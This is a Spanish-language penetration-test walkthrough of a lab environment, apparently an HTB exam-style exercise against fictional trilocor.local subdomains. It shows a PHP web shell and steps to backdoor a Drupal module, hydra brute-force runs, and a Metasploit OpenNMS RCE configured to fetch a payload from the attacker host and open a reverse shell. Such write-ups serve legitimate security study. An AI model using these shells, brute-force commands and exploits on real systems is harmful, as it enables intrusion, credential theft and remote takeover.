|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:30:48 /2025-12-17/

[23:30:48] [INFO] parsing HTTP request from 'selfservice.req'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
[23:30:49] [INFO] resuming back-end DBMS 'mysql' 
[23:30:49] [INFO] testing connection to the target URL
<SNIP>
back-end DBMS: MySQL >= 5.0.12
banner: '8.0.30-0ubuntu0.20.04.2'
[23:30:59] [INFO] fetching current user
[23:30:59] [INFO] retrieved: status-admin@localhost
current user: 'status-admin@localhost'
[23:31:08] [INFO] fetching current database
[23:31:08] [INFO] retrieved: status
current database: 'status'
[23:31:10] [INFO] fetching server hostname
[23:31:10] [INFO] retrieved: 28fa370c0717
hostname: '28fa370c0717'
[23:31:15] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/selfservicestg.trilocor.local'
[23:31:15] [WARNING] your sqlmap version is outdated

[*] ending @ 23:31:15 /2025-12-17/
```

1. **MySQL Version:** `8.0.30-0ubuntu0.20.04.2`
2. **Usuario actual:** `status-admin@localhost`
3. **Base de datos actual:** `status`
4. **Hostname del servidor:** `28fa370c0717` (es un contenedor Docker)
5. **SO:** `Ubuntu 20.04`
6. **Web Server:** `Apache 2.4.41`

Al ser un contenedor Docker no tiene sentido intentar acceder a la base de datos mediante **XP\_CMDSHELL**, ya que no podríamos llegar hasta la `DMZ01` en una red interna. Tenemos emails, usuarios válidos y 2 contraseñas crackeadas, sufiente para seguir probando cosas.

Sigamos.

***

## <mark style="color:purple;">blog.trilocor.local</mark>

Es un `Drupal 9.4.8` (**del año 2022**), por lo que probablemente sea poco vulnerable. Además parece que es un drupal sin configurar, como si se arrancara por primera vez, lo que puede ser altamente vulnerable y no debería estar expuesto en la red externa.

<figure><img src="/files/LMCRRUKyczeM7oqc7YgP" alt=""><figcaption></figcaption></figure>

#### Enumeración de tecnologías

{% code overflow="wrap" %}

```bash
whatweb http://blog.trilocor.local

http://blog.trilocor.local [200 OK] Apache[2.4.54], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTML5, HTTPServer[Debian Linux][Apache/2.4.54 (Debian)], IP[10.129.101.223], MetaGenerator[Drupal 9 (https://www.drupal.org)], PHP[8.0.24], Script[application/json], Title[Home | Umami Food Magazine], UncommonHeaders[x-drupal-dynamic-cache,x-content-type-options,permissions-policy,x-generator,x-drupal-cache], Via-Proxy[1.1 blog.trilocor.local], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.0.24], X-UA-Compatible[IE=edge]
```

{% endcode %}

Observamos que es un `Drupal 9.4.8` sobre `Apache 2.4.54`.

#### Análisis web

Vamos a montar el Drupal para ver hasta donde podemos acceder:

<figure><img src="/files/ONfaJjWRDN3BkROoWDH5" alt=""><figcaption></figcaption></figure>

Y podemos acceder al interior con el usuario que hemos creado.

{% hint style="success" %}
Añadir esto al informe, usuario creado `afsh4ck:afsh4ck`
{% endhint %}

<figure><img src="/files/KZuVJboQRAJJ3FnKUE0L" alt=""><figcaption></figcaption></figure>

En people vemos que somos administrador por defecto:

<figure><img src="/files/PB6YZdbYeuOBEhagks8E" alt=""><figcaption></figcaption></figure>

A partir de la versión 8, el módulo [PHP FIlter](https://www.drupal.org/project/php/releases/8.x-1.1) no viene instalado por defecto, que nos permitiría introducir una reverse shell en PHP. Para habilitar este módulo lo tendremos que subir nosotros mismos.

<figure><img src="/files/JE7FVZhLWkYxiUIejAbq" alt=""><figcaption></figcaption></figure>

#### Descarga y subida de PHP Filter

```
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Una vez descargado lo subiremos desde Extend > Add new module

<figure><img src="/files/7PC7wDq5eV8eccmlNARx" alt=""><figcaption></figcaption></figure>

Pero al subirlo nos da un error que no nos permite continuar:

<figure><img src="/files/maeHZxTSXj6Y9SeRn4g8" alt=""><figcaption></figcaption></figure>

En las versiones actuales ya no es posible instalar complementos teniendo solo acceso a la web después de la instalación predeterminada.

Si tuvieramos una versión más antigua se podría crear un módulo con backdoor **añadiendo un shell a un módulo existente** . Los módulos se pueden encontrar en el sitio web drupal.org. Seleccionemos un módulo como [CAPTCHA](https://www.drupal.org/project/captcha) . Nos desplazamos hacia abajo y copiamos el enlace del [archivo](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz) tar.gz.

**Descargamos el archivo y extraemos su contenido.**

```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```

**Crea un shell web PHP con el contenido**

```
<?php
system($_GET["cmd"]);
?>
```

Creamos un archivo **`.htaccess`** para acceder a la carpeta. Esto es necesario, ya que Drupal deniega el acceso directo a la carpeta **`/modules`**.

```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

La configuración anterior aplicará reglas para la carpeta / al solicitar un archivo en `/modules`. Copia ambos archivos a la carpeta captcha y cree un archivo.

```
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```

Haz clic en `Manage` > `Extend` > `+ Install new module`

Eso sería la demostración de la explotación, pero en este caso no podemos. Por el momento podemos añadir al informe una vulnerabilidad `Unnecessary Exposed Drupal Service` y seguiremos.

***

## <mark style="color:purple;">dev.trilocor.local</mark>

Parece un sitio de pruebas de desarrollo, y al acceder llegamos a la típica página de inicio por defecto de Apache:

<figure><img src="/files/97elodCivYiiJjECv4Ge" alt=""><figcaption></figcaption></figure>

#### Enumeración de tecnologías

{% code overflow="wrap" %}

```bash
whatweb http://dev.trilocor.local

http://dev.trilocor.local [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.101.223], Title[Apache2 Ubuntu Default Page: It works], Via-Proxy[1.1 dev.trilocor.local]
```

{% endcode %}

Encontramos la versión de `Apache 2.4.41` y probamos varios exploits públicos sin éxito.

#### Fuzzing

Al fuzzear directorios no encontramos nada, por lo que no merece la pena seguir enumerando este host.

```bash
gobuster dir -u http://dev.trilocor.local \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,js,json,bak,old,orig,save \
  -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.trilocor.local
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,orig,php,json,bak,old,save,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 283]
/index.html           (Status: 200) [Size: 10918]

Progress: 2205610 / 2205610 (100%)
===============================================================
Finished
===============================================================
```

Lo añadiremos al informe como `Unnecessary Exposed Apache Service`

***

## <mark style="color:purple;">jobs.trilocor.local</mark>

Parece un portal de trabajo, y al acceder solo vemos un formulario de login con usuario y contraseña:

<figure><img src="/files/IKXZipZCUdEFkokhmHVF" alt=""><figcaption></figcaption></figure>

#### Enumeración de tecnologías

{% code overflow="wrap" %}

```bash
whatweb http://jobs.trilocor.local

http://jobs.trilocor.local [200 OK] Apache[2.4.54], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Unix][Apache/2.4.54 (Unix)], IP[10.129.101.223], PHP[7.4.26], PasswordField[password], Script, Title[Trilocor - Job Portal], Via-Proxy[1.1 jobs.trilocor.local], X-Powered-By[PHP/7.4.26]
```

{% endcode %}

Observamos que es una web custom con Bootstrap sobre `Apache 2.4.54`.

Probamos las credenciales crackeadas pero no funcionan, por lo que intentaremos fuerza bruta con todos los usuarios descubiertos.

#### Bruteforce de login

Al probar las credenciales `admin:admin` vemos el error a proporcionar a hydra:

```
Error! Invalid username or password.
```

<figure><img src="/files/3Xc0bo8xSQalUAEOBNvR" alt=""><figcaption></figcaption></figure>

```bash
hydra -L valid-users.txt -P /usr/share/wordlists/rockyou.txt \
  jobs.trilocor.local http-post-form \
  "/index.php:username=^USER^&password=^PASS^:F=Error! Invalid username or password." \
  -s 5000 \
  -t 4 \
  -w 10 \
  -f \
  -V \
  -I

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-16 01:16:35
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
[DATA] attacking http-post-form://jobs.trilocor.local:5000/index.php:username=^USER^&password=^PASS^:F=Error! Invalid username or password.
[ERROR] all children were disabled due too many connection errors
0 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-16 01:17:07
```

El problema es que el servidor está bloqueando las conexiones rápidas ya que tendrá algún mecanismo para evitar fuerza bruta.

#### Fuzzing

```bash
dirsearch -u http://jobs.trilocor.local -x 404,403

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Escritorio/machines/htb/cpts/recon/reports/http_jobs.trilocor.local/_25-12-15_21-46-27.txt

Target: http://jobs.trilocor.local/

[21:46:27] Starting: 
[21:46:48] 301 -  325B  - /assets  ->  http://jobs.trilocor.local/assets/
[21:46:48] 200 -  263B  - /assets/
[21:46:51] 200 -  820B  - /cgi-bin/printenv
[21:46:51] 200 -    1KB - /cgi-bin/test-cgi
[21:47:01] 200 -    0B  - /includes/
[21:47:01] 301 -  327B  - /includes  ->  http://jobs.trilocor.local/includes/

Task Completed
```

En la ruta `/assets` expone un directory listing, pero sin ningún archivo relevante. Esto en si es un fallo de seguridad y lo podríamos reportar.

<figure><img src="/files/d9js6I8O2IQE4vfFa1um" alt=""><figcaption></figcaption></figure>

En la ruta `/cgi-bin/printenv` encontramos un mensaje muy interesante:

<figure><img src="/files/fpys1w0SXurzSu0kiAmL" alt=""><figcaption></figcaption></figure>

Dice que si descomentamos la primera línea podríamos filtrar las variables de entorno y filtrar información sensible, pero para esto necesitaríamos poder editar el código fuente.

Y la ruta nos muestra las variables de entorno que se filtrarían, pero de igual manera para esto tendríamos que poder editar el código fuente:

<figure><img src="/files/zYSPm7DEADNN2OMZMQbe" alt=""><figcaption></figcaption></figure>

Por el momento seguiremos al siguiente subdominio, por lo menos hasta que consigamos usuarios válidos.

***

## <mark style="color:purple;">news.trilocor.local</mark>

Parece el portal de relaciones públicas de la empresa:

<figure><img src="/files/XruOwtSNp5dys0mVkjfX" alt=""><figcaption></figcaption></figure>

Es una landing page con varias secciones

<figure><img src="/files/gr1nIYxRFevEXBTLJdq8" alt=""><figcaption></figcaption></figure>

Analizando las secciones la única interesante es la de Hire us, que tiene un formulario:

<figure><img src="/files/k2BD7ad3G1pi3ABEKOfp" alt=""><figcaption></figcaption></figure>

Al enviar el formulario parece que nuestros datos realmente no se están enviando a ningún lado y la petición se hace por `GET` a `/?`

<figure><img src="/files/7vbKba7Kv1nhsJ0nQzRM" alt=""><figcaption></figcaption></figure>

Esto podría indicar:

1. **Frontend mal implementado** - JavaScript que no funciona
2. **Parámetros ocultos** en la URL
3. **Posible LFI/RFI** si acepta parámetros de archivo
4. **SQLi/XSS** si procesa input sin sanitizar

#### Enumeración de tecnologías

{% code overflow="wrap" %}

```bash
whatweb http://news.trilocor.local

http://news.trilocor.local [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[trilocor@trilocor.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.101.223], JQuery[2.2.4], Script, Title[Trilocor Public Relations], Via-Proxy[1.1 news.trilocor.local]
```

{% endcode %}

Observamos que es una web custom sobre `Apache 2.4.41`.

#### Fuzzing

Haciendo fuzzing de directorios nos encontramos un archivo de base de datos expuesto al que podemos acceder desde el navegador:

```bash
feroxbuster -u http://news.trilocor.local/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
                                                                                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://news.trilocor.local/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      281c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      284c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        9l      100w      942c http://news.trilocor.local/static/images/logo.svg
200      GET        1l      346w    25940c http://news.trilocor.local/static/js/functions-min.js
200      GET     1632l     2385w    31406c http://news.trilocor.local/static/css/main.css
200      GET      279l     1571w   129423c http://news.trilocor.local/static/images/team-1.png
200      GET      212l     2649w   153263c http://news.trilocor.local/static/images/introduction-visual.png
200      GET      348l     1857w   150663c http://news.trilocor.local/static/images/team-2.png
301      GET        9l       28w      327c http://news.trilocor.local/static => http://news.trilocor.local/static/
<SNIP>
200      GET      907l     1976w    21812c http://news.trilocor.local/static/js/db.js
200      GET       80l      165w     1877c http://news.trilocor.local/static/js/desktop-notification.js
200      GET       25l       69w      821c http://news.trilocor.local/static/js/data-table.js
<SNIP>
```

Accedemos a `http://news.trilocor.local/static/js/db.js`

Y encontramos tanto clientes:

<figure><img src="/files/B6lFFB29YRQPdA6zWEtp" alt=""><figcaption></figcaption></figure>

Cómo usuarios de la base de datos:

<figure><img src="/files/TNvRHLTHHKwIHCFDywq2" alt=""><figcaption></figcaption></figure>

Estos usuarios de la base de datos podrían ser empleados de Trilocor y nos podrían servir para ataques de fuerza bruta o ingresar a otros servicios. Los guardaremos a dos archivos separados con el siguiente script:

```bash
# Extraer los UUIDs (Account field)
echo "=== EXTRACTING USER UUIDs ==="
curl -s "http://news.trilocor.local/static/js/db.js" | \
  grep -o '"Account": "[^"]*"' | \
  cut -d'"' -f4 > user_uuids.txt

echo "Usuarios encontrados:"
cat user_uuids.txt

# Extraer nombres también
curl -s "http://news.trilocor.local/static/js/db.js" | \
  grep -o '"Name": "[^"]*"' | \
  cut -d'"' -f4 > user_names.txt

paste user_names.txt user_uuids.txt | column -t
```

Probamos fuzzing de directorios, de parámetros, LFI, etc y no encontramos nada explotable, por lo que pasaremos al siguiente host.

***

## <mark style="color:purple;">shop.trilocor.local</mark>

Llegamos a lo que parece la tienda, pero que en verdad no vende productos, ya que el core de esta empresa es la robótica y se supone que venden algo más privado:

<figure><img src="/files/aBcv1erYhdpeKgXF2ali" alt=""><figcaption></figcaption></figure>

#### Enumeración de tecnologías

{% code overflow="wrap" %}

```bash
whatweb http://shop.trilocor.local

http://shop.trilocor.local [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.101.223], JQuery[1.12.3], Script, Title[TRILOCOR Shop | Home], Via-Proxy[1.1 shop.trilocor.local], X-UA-Compatible[IE=edge]
```

{% endcode %}

Observamos que es una web custom con Bootstrap sobre `Apache 2.4.41`.

<figure><img src="/files/s6kseYQ0SJicBKYmnJoZ" alt=""><figcaption></figcaption></figure>

En la página `/contact` nos encontramos el formulario que parece el único vector explotable:

<figure><img src="/files/vsky2LFwI8XtrBsz877O" alt=""><figcaption></figcaption></figure>

Al enviar el formulario, vemos que se añaden todos los campos a la url de la siguiente manera, lo cual puede dar pie a alguna vulnerabilidad:

```
http://shop.trilocor.local/contact?fname=name&lname=surname&email=test%40test.es&phone=tel&message=message
```

#### BurpSuite

Al analizar el envio con BurpSuite vemos que los datos se envían por GET directamente:

<figure><img src="/files/E1hZ9UrxqSNxrRBf9NVt" alt=""><figcaption></figcaption></figure>

Esta es la petición:

```bash
GET /contact?fname=test&lname=test&email=test%40test.es&phone=666778899&message=Test HTTP/1.1
Host: shop.trilocor.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://shop.trilocor.local/contact?fname=name&lname=surname&email=test%40test.es&phone=tel&message=message
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

#### XSS

No hay ningún parámetro vulnerable a XSS

```bash
python xsstrike.py -u "http://shop.trilocor.local/contact?fname=test&lname=test&email=test&phone=test&message=test"  

	XSStrike v3.1.5

[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: fname 
[-] No reflection found 
[!] Testing parameter: lname 
[-] No reflection found 
[!] Testing parameter: email 
[-] No reflection found 
[!] Testing parameter: phone 
[-] No reflection found 
[!] Testing parameter: message 
[-] No reflection found 
```

Probamos Blind XSS, SQLi con SQL Map, y tampoco tenemos resultados.

Por el momento lo dejaremos.

***

## <mark style="color:purple;">hrportal.trilocor.local</mark>

Es el portal de recursos humanos con un panel de login:

<figure><img src="/files/sAI9W2KtfXNbFwjdEJ6R" alt=""><figcaption></figcaption></figure>

Con credenciales por defecto `admin:admin` no entramos y tampoco funcionan las credenciales crackeadas de `ccruz` e `infra`. Probamos SQL Injection en los 2 campos y tampoco funciona.

#### Enumeración de tecnologías

{% code overflow="wrap" %}

```bash
whatweb http://hrportal.trilocor.local

http://hrportal.trilocor.local [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.101.223], PasswordField[password], Script, Title[Human Resources - Login], Via-Proxy[1.1 hrportal.trilocor.local]
```

{% endcode %}

Observamos que es una web custom sobre `Apache 2.4.41`.

#### BurpSuite

Vemos que envía los datos por post a `/index.php` (lo cual es muy raro que vaya a la misma página y no a `/login` por ejemplo) y los datos se envían en formato:

```
username=admin&password=password
```

El error es `Invalid login details.`

<figure><img src="/files/i1tqBceqIa7PzYkQZKdl" alt=""><figcaption></figcaption></figure>

#### Bruteforce

Usaremos la lista de usuarios válidos dumpeados tras el SQL Injection:

```bash
hydra -L valid-users.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt hrportal.trilocor.local http-post-form "/index.php:username=^USER^&password=^PASS^:F=Invalid login details." -I  

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-17 17:09:42
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 94370 login tries (l:10/p:9437), ~5899 tries per task
[DATA] attacking http-post-form://hrportal.trilocor.local:80/index.php:username=^USER^&password=^PASS^:F=Invalid login details.
[STATUS] 2564.00 tries/min, 2564 tries in 00:01h, 91806 to do in 00:36h, 16 active
[STATUS] 2523.67 tries/min, 7571 tries in 00:03h, 86799 to do in 00:35h, 16 active
[STATUS] 2548.71 tries/min, 17841 tries in 00:07h, 76529 to do in 00:31h, 16 active
[STATUS] 2507.80 tries/min, 37617 tries in 00:15h, 56753 to do in 00:23h, 16 active
[STATUS] 2514.45 tries/min, 50289 tries in 00:20h, 44081 to do in 00:18h, 16 active
[STATUS] 2504.12 tries/min, 62603 tries in 00:25h, 31767 to do in 00:13h, 16 active
[STATUS] 2524.30 tries/min, 75729 tries in 00:30h, 18641 to do in 00:08h, 16 active
[STATUS] 2524.51 tries/min, 88358 tries in 00:35h, 6012 to do in 00:03h, 16 active
[STATUS] 2516.97 tries/min, 90611 tries in 00:36h, 3759 to do in 00:02h, 16 active
[STATUS] 2423.49 tries/min, 90881 tries in 00:37h, 3489 to do in 00:02h, 16 active
[STATUS] 2406.34 tries/min, 92644 tries in 00:38h, 1726 to do in 00:01h, 16 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-17 17:48:53
```

Esta web si nos permite hacer ataques de fuerza bruta sin limitación, pero con los usuarios dumpeados no obtenemos resultados. También probamos con las contraseñas crackeadas y no funciona.

#### Fuzzing

El fuzzing no revela ningún directorio interesante. De momento un rabbit hole.

***

## <mark style="color:purple;">nms.trilocor.local</mark>

[OpenNMS](https://www.opennms.com/platform/) es una plataforma de gestión y monitorización de redes de código abierto ([Open Source](https://www.google.com/search?q=Open+Source\&oq=que+es+open+nms\&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIICAEQABgNGB4yCggCEAAYgAQYogQyCggDEAAYgAQYogQyCggEEAAYgAQYogQyCggFEAAYogQYiQXSAQgzMjgxajBqN6gCALACAA\&sourceid=chrome\&ie=UTF-8\&mstk=AUtExfCRzd4cdOZnwHbiSyyolxdOARlHLRqrU_fTb2i7XSUOWC5r4kt_tLoBTE5OE-EoKjSbZ0Es1rwjvt_ogiw62QLttohS8B_MeW18dstjy-0EUpuxiCwMFvh7VeOiyzAyOU69szwgGpTyKiORHz6aCjSLq5-UH6eU665-V2nG5tQ_sok\&csui=3\&ved=2ahUKEwih8ZHPpcCRAxX8OfsDHUIeJfIQgK4QegQIARAD)), escalable y robusta, que permite a empresas y proveedores de servicios visualizar, monitorizar y gestionar de forma integral sus redes locales y distribuidas, detectando fallos, analizando rendimiento y tráfico, y generando alertas en un único lugar, integrándose fácilmente con otras aplicaciones de negocio.&#x20;

Al acceder llegamos a un login principal:

<figure><img src="/files/5wnyUl4fRaQq8nvEjBPu" alt=""><figcaption></figcaption></figure>

Probamos las credenciales por defecto `admin:admin` y accedemos, lo que es un fallo grave de seguridad y lo incluiremos en nuestro informe cómo `Weak Admin Credentials`

<figure><img src="/files/GPHYsCilWHuuPZZbedfE" alt=""><figcaption></figcaption></figure>

En el footer encontramos la versión:

```
Version: 30.0.5-SNAPSHOT
```

#### Enumeración de tecnologías

{% code overflow="wrap" %}

```bash
whatweb http://nms.trilocor.local

http://nms.trilocor.local [302 Found] Apache[2.4.41], Cookies[JSESSIONID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.101.223], RedirectLocation[http://nms.trilocor.local/opennms/], Via-Proxy[1.1 nms.trilocor.local], X-Frame-Options[SAMEORIGIN]
http://nms.trilocor.local/opennms/ [302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.101.223], RedirectLocation[http://nms.trilocor.local/opennms/frontPage.htm], Via-Proxy[1.1 nms.trilocor.local], X-Frame-Options[SAMEORIGIN]
http://nms.trilocor.local/opennms/frontPage.htm [302 Found] Apache[2.4.41], Cookies[JSESSIONID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], HttpOnly[JSESSIONID], IP[10.129.101.223], RedirectLocation[http://nms.trilocor.local/opennms/login.jsp;jsessionid=node0rwbyg8e3ztuqjgp5tngeoxdq1063.node0], Via-Proxy[1.1 nms.trilocor.local], X-Frame-Options[SAMEORIGIN]
http://nms.trilocor.local/opennms/login.jsp;jsessionid=node0rwbyg8e3ztuqjgp5tngeoxdq1063.node0 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.101.223], PasswordField[j_password], Script[text/javascript], Title[OpenNMS Web Console][Title element contains newline(s)!], Via-Proxy[1.1 nms.trilocor.local], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge]
```

{% endcode %}

Observamos que es un Open NMS sobre `Apache 2.4.41`.

### Explotación

Vamos a probar algún exploit público para conseguir RCE. Encontramos algunos cómo:

{% embed url="<https://sploitus.com/exploit?id=MSF:EXPLOIT-LINUX-HTTP-OPENNMS_HORIZON_AUTHENTICATED_RCE->" %}

{% embed url="<https://www.exploit-db.com/exploits/40610>" %}

Parece que los tenemos disponibles en Metasploit, así que vamos a ello!

```bash
msf6 > search Open NMS

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   -  ----                                                  ---------------  ----       -----  -----------
   0  exploit/windows/misc/ibm_websphere_java_deserialize   2015-11-06       excellent  No     IBM WebSphere RCE Java Deserialization Vulnerability
   1  exploit/linux/misc/jenkins_java_deserialize           2015-11-18       excellent  Yes    Jenkins CLI RMI Java Deserialization Vulnerability
   2  exploit/linux/http/librenms_addhost_cmd_inject        2018-12-16       excellent  No     LibreNMS addhost Command Injection
   3  auxiliary/gather/opennms_xxe                          2015-01-08       normal     No     OpenNMS Authenticated XXE
   4  exploit/linux/http/opennms_horizon_authenticated_rce  2023-07-01       excellent  Yes    OpenNMS Horizon Authenticated RCE
   5  exploit/linux/misc/opennms_java_serialize             2015-11-06       normal     No     OpenNMS Java Object Unserialization Remote Code Execution
   6    \_ target: OpenNMS / Linux x86                      .                .          .      .
   7    \_ target: OpenNMS / Linux x86_64                   .                .          .      .
```

Probaremos el 4: `opennms_horizon_authenticated_rce`. Probamos a ejecutarlo pero no funciona de primeras, debemos seguir los pasos de este post de GitHub:

{% embed url="<https://github.com/rapid7/metasploit-framework/issues/20306>" %}

Debemos editar en Kali el archivo:

```
framework/modules/exploits/linux/http/opennms_horizon_authenticated_rce.rb
```

Cambiando la línea 43 de:

```
'Arch' => 'ARCH_CMD',
```

a

```
'Arch' => '',
```

Y ya podremos usar el exploit:

```bash
# Seleccionar el exploit
msf6 > use exploit/linux/http/opennms_horizon_authenticated_rce

# Configurar opciones básicas
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > setg RHOSTS 10.129.101.37
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > set RPORT 80
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > set VHOST nms.trilocor.local
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > set USERNAME admin
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > set PASSWORD admin

# Configurar LHOST y LPORT
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > setg LHOST 10.10.14.41
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > set LPORT 4444

# Configurar opciones específicas del payload
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > set FETCH_SRVHOST 10.10.14.41
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > set FETCH_URIPATH /opennms/
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > set FETCH_FILENAME opennms_exploit
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > set FETCH_SRVPORT 8082
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > set AutoCheck false
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > set ForceExploit true

# Verificar configuración y ejecutar
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > options
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > run
```

Al ejecutarlo nos dará este error:

```bash
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > run
[*] Started reverse TCP handler on 10.10.14.19:4444 
[!] AutoCheck is disabled, proceeding with exploitation
[-] Exploit aborted due to failure: unexpected-reply: Unexpected response received while attempting to obtain the notificationCommands.xml file. User admin my lack the required privileges.
[*] Attempting cleanup...
[*] Exploit completed, but no session was created.
```

Tendremos que hacer una escalada de privilegios del usuario `admin` a `ROLE_FILESYSTEM_EDITOR`

{% embed url="<https://docs.opennms.com/meridian/2022/operation/user-management/security-roles.html>" %}

Para ello vamos a:

```
Configure OpenNMS > Configure Users, Groups and On-Call Roles > Configure Users.
```

Aqui le damos al lapiz de editar el usuario admin:

<figure><img src="/files/8RELP2sSWWivDqDFb1YB" alt=""><figcaption></figcaption></figure>

Añadimos el permiso `ROLE_FILESYSTEM_EDITOR` y abajo del todo pulsamos en `Finish`

<figure><img src="/files/n2ctYs21fmgfifjsqNpP" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Este cambio lo incluiremos en nuestro informe, ya que hemos modificado permisos de un usuario
{% endhint %}

Y listo! Vamos a ejecutar de nuevo el exploit:

```bash
msf6 exploit(linux/http/opennms_horizon_authenticated_rce) > run
[*] Started reverse TCP handler on 10.10.14.19:4444 
[!] AutoCheck is disabled, proceeding with exploitation
[*] Successfully edited notificationCommands.xml
[*] Successfully edited destinationPaths.xml
[*] Successfully edited notifications.xml
[+] Successfully uploaded the payload to buuigpgqj.bsh
[*] Triggering the notification to execute the payload
[*] Received expected response while triggering the payload. Please be patient, it may take a few seconds for the payload to execute.
[*] Sending stage (3045380 bytes) to 10.129.101.37
